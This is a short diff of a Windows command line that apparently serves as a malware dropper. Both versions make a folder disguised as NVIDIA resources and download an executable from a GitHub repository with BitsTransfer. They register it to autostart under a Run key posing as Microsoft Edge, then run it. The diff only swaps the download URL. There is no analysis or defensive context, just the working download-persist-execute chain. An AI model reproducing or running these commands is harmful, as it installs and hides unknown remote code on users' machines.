@@ -1,2 +1,2 @@
-md C:\ProgramData\NVIDIA\Resources; import-module BitsTransfer; Start-BitsTransfer ("https://raw.githubusercontent.com/alejq41/free/main/Nvidia.platform.exe") ("C:\ProgramData\NVIDIA\Resources");REG ADD HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v Microsoft_Edge_Company2 /d C:\ProgramData\NVIDIA\Resources\running.exe; cd C:\ProgramData\NVIDIA\Resources; running.exe
+md C:\ProgramData\NVIDIA\Resources; import-module BitsTransfer; Start-BitsTransfer ("https://github.com/alejq41/free/blob/main/running.exe") ("C:\ProgramData\NVIDIA\Resources");REG ADD HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v Microsoft_Edge_Company2 /d C:\ProgramData\NVIDIA\Resources\running.exe; cd C:\ProgramData\NVIDIA\Resources; running.exe
 exit
